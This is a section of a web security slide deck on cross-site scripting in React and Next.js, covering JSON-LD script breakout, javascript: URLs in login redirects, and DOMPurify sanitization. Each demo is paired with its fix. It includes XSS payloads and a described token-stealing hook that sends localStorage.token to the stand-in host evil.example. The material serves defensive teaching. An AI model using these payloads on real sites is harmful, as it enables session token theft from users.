---
layout: section
routeAlias: dangerous-code
style: "--accent: var(--green)"
---

<div class="section-num">02</div>

# Dangerous code

<div class="section-sub">What React escapes, and the escape hatches that bypass it</div>

---

# Even JSON can break out

<div class="sub">Structured data for search engines (JSON-LD), rendered on the server as in the Next.js docs</div>

```jsx
const jsonLd = { name: product.name, description: product.description }
<script type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```

<div class="cols json-cols">
<div>

<div class="note">A seller saves this product description:</div>

```html
</script><img src=x onerror=steal()>
```

<div v-click="4" class="card lit json-fix">
<div class="col-h ok"><lucide-check /> The fix from the same docs</div>

```js
JSON.stringify(jsonLd).replace(/</g, '\\u003c')
```

</div>
</div>
<div>

<ol class="json-steps">
  <li v-click="1"><b>Quotes are escaped, <code>&lt;</code> is not</b>: JSON.stringify escapes for JSON, not for HTML</li>
  <li v-click="2"><b>The HTML parser doesn't read JSON</b>: the first <code>&lt;/script&gt;</code> it sees ends the script tag</li>
  <li v-click="3"><b>What follows is parsed as page HTML</b>: the <code>&lt;img&gt;</code> fails, its <code>onerror</code> runs, and the page only shows a stray <code>"}</code></li>
</ol>

</div>
</div>

<div v-click="5" class="punch">Every parser that reads the string needs its own escaping</div>

<div class="foot"><lucide-info /> <b>steal()</b> stands for the hook's code: read localStorage.token, send it to evil.example</div>

<div class="source"><lucide-link /><a href="https://nextjs.org/docs/app/guides/json-ld" target="_blank">Next.js: JSON-LD ("JSON.stringify … does not sanitize malicious strings")</a></div>

<style>
.json-cols { margin-top: 0.4rem; }
.json-fix { margin-top: 0.6rem; padding: 0.5rem 0.9rem; }
.json-steps { font-size: 0.85rem; margin-top: 0.8rem; }
.json-steps li { margin: 0.5rem 0; line-height: 1.45; }
.json-steps b { color: var(--orange); }
</style>

---

# Reproduction: JSON-LD breakout <span class="badge" style="--c: var(--red)">demo</span>

<div class="sub">The same product page, as the server sends it, as the browser parses it, and as the user sees it</div>

<JsonLdScheme />

<div class="pills"><DemoLink href="demos/jsonld.html">JSON.stringify</DemoLink><DemoLink href="demos/jsonld-fixed.html">Escaped</DemoLink></div>

<div class="foot"><lucide-search /> On the demo page, compare <b>View Source</b> with DevTools → <b>Elements</b>. Network shows the request to evil.example</div>

---

# URLs are code too

<MdnLink path="Web/URI/Reference/Schemes/javascript">javascript: URLs run their text as code when the browser navigates to them</MdnLink>

<div class="note">An attacker sends users a link to your login page. After sign-in, your code navigates to <code>?next=</code></div>

<div class="cols">
<div class="card">
<div class="col-h ng"><lucide-x /> Navigating in your own code</div>

```js
// /login?next=javascript:steal()
const next = searchParams.get('next')
location.href = next // runs steal()
```

</div>
<div class="card lit">
<div class="col-h ok"><lucide-check /> Only allow your own origin</div>

```js
const url = new URL(next, location.origin)
if (url.origin === location.origin) {
  location.href = url.href
}
```

</div>
</div>

- **React 19 guards JSX**: it blocks `javascript:` in `href` and `src` (React 18 only warns)
- **Next.js 16.2+ guards its router**: `router.push` throws, Server Action redirects are blocked
- **Browser APIs have no guard**: `location.href`, `window.open`
- **Same check stops open redirects**: `?next=https://evil.example` is refused too

<div class="source"><lucide-link /><a href="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" target="_blank">React 19 upgrade guide</a> · <a href="https://github.com/vercel/next.js/pull/88185" target="_blank">Next.js #88185: disallow javascript URLs in router methods and redirects</a></div>

<style>
.cols { margin-top: 1rem; }
.cols + ul { margin-top: 1.1rem; }
.cols + ul li { margin: 0.45rem 0; }
.cols .card pre, .cols .card .slidev-code { font-size: 0.72rem !important; }
</style>

---

# Reproduction: javascript: in ?next= <span class="badge" style="--c: var(--red)">demo</span>

<div class="sub">The same link opens both pages: <code>login.html?next=javascript:steal()</code>, then Continue</div>

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> location.href = next</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> Origin check first</div>

<div class="devtools">
<div class="dt-h">On the page</div>
<div class="dt-row ok">Refused: javascript:steal() is not on https://…</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/login.html?next=javascript:steal()">Without the check</DemoLink><DemoLink href="demos/login-fixed.html?next=javascript:steal()">With the check</DemoLink></div>

<div class="foot"><lucide-flask-conical /> The demo pages send a fake token to <b>evil.example</b>, a reserved domain that never resolves. Nothing leaves the browser</div>

---

# When you really need HTML: sanitize

<div class="sub">A sanitizer keeps the formatting and removes everything that can run</div>

```jsx {4-5}
import DOMPurify from 'dompurify'

function Post({ post }) {
  const clean = DOMPurify.sanitize(post.body) // the hook's payload → <img src="x">
  return <article dangerouslySetInnerHTML={{ __html: clean }} />
}
```

- **Use a maintained sanitizer**: it keeps only known-safe tags; DOMPurify, `rehype-sanitize`
- **Sanitize right before rendering**: the HTML that reaches `__html` is the HTML that was checked
- **Don't write your own, keep it updated**: regexes miss cases, new bypasses appear
- **Know your Markdown library**: `marked` doesn't sanitize; `react-markdown` does until `rehype-raw`
- **Coming to browsers**: `Element.setHTML()` sanitizes natively, not in every major browser yet (Baseline, 2026.11)

<div class="source"><lucide-link /><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP: XSS prevention</a> · <a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a> · <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML" target="_blank">MDN: Element.setHTML() (limited availability, 2026.11)</a> · <a href="https://marked.js.org/" target="_blank">marked</a> · <a href="https://github.com/remarkjs/react-markdown#security" target="_blank">react-markdown: security</a></div>

---

# Reproduction: the hook, sanitized <span class="badge" style="--c: var(--red)">demo</span>

<div class="sub">The hook's post body, with and without <code>DOMPurify.sanitize</code></div>

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> Raw</div>

<div class="devtools">
<div class="dt-h">DevTools → Elements</div>
<div class="dt-row">&lt;img src="x" onerror="const t = localStorage.token …"&gt;</div>
</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> Sanitized</div>

<div class="devtools">
<div class="dt-h">DevTools → Elements</div>
<div class="dt-row ok">&lt;img src="x"&gt;</div>
</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ok">no request to evil.example</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/hook.html">Raw</DemoLink><DemoLink href="demos/sanitize.html">Sanitized</DemoLink></div>

<div class="foot"><lucide-flask-conical /> The demo pages send a fake token to <b>evil.example</b>, a reserved domain that never resolves. Nothing leaves the browser</div>

---
routeAlias: dangerous-takeaway
---

# React escapes text. The rest is yours

<div class="sub">When a string turns into something else, check where it came from</div>

<div class="cheat">

| Becomes | Risky APIs | Do this instead |
|---|---|---|
| HTML | `dangerouslySetInnerHTML`, `innerHTML` | render as JSX text; if you need HTML, sanitize it first |
| Code | `eval`, `new Function`, `setTimeout('…')` | never with data: pass functions, parse JSON with `JSON.parse` |
| A URL | `location.href = …`, `window.open(…)` | parse with `new URL`, allow only your origin or a fixed list of hosts |

</div>

<div class="punch">Every escape hatch is a place where escaping is now your job</div>

<div class="foot"><lucide-search /> Finding them in a codebase: search for <b>dangerouslySetInnerHTML</b>, <b>innerHTML</b>, <b>eval(</b>, <b>location.href</b> and <b>window.open</b></div>

<div class="bridge">Libraries make some of these choices for you → <b>Code you didn't write</b></div>

<style>
.cheat table { font-size: 0.95rem; margin-top: 1rem; }
.cheat th, .cheat td { padding: 0.65rem 0.7rem !important; }
.cheat td:first-child { white-space: nowrap; font-weight: bold; }
</style>
